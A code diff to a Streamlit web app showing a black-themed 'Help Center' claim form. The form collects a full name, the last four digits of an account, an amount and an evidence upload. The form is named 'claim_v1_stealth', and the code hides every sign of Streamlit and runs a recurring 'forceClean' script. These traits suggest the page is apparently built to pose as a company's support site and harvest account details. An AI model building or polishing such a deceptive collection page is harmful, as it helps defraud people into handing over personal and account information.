@@ -41,12 +41,12 @@ st.markdown("""<script>
     setInterval(forceClean, 100);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS: BLOQUEO DEFINITIVO
+# 2. CSS: BLOQUEO DEFINITIVO Y ESTILO DE FORMULARIO
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 2rem !important; }
 
-    /* Ocultar todo rastro de Streamlit y Anchor Links */
+    /* Ocultar todo rastro de Streamlit */
     header, footer, .stDeployButton, [data-testid='stHeader'], 
     [data-testid="stElementToolbar"], .stElementToolbar, 
     button[title="View fullscreen"], .stTooltipHoverTarget,
@@ -77,6 +77,13 @@ st.markdown("""<style>
         [data-testid="stImage"] img { width: 180px !important; }
     }
 
+    /* Estilo de Inputs para mejor visibilidad */
+    .stTextInput input, .stNumberInput input {
+        background-color: #1a1a1a !important;
+        color: white !important;
+        border: 1px solid #333 !important;
+    }
+
     .stButton > button { background-color: #00a05b !important; color: white !important; width: 100%; border: none; height: 50px; border-radius: 8px; }
 
     .promo-box {
@@ -94,8 +101,8 @@ st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
 with st.form("claim_v1_stealth", clear_on_submit=True):
-    st.text_input("Full Name")
-    st.text_input("Last 4 digits of Account")
+    st.text_input("Full Name", autocomplete="name")
+    st.text_input("Last 4 digits of Account", autocomplete="off")
     st.number_input("Amount", min_value=0.0)
     st.file_uploader("Evidence", type=["jpg","png"])
     if st.form_submit_button("SUBMIT NOW"):
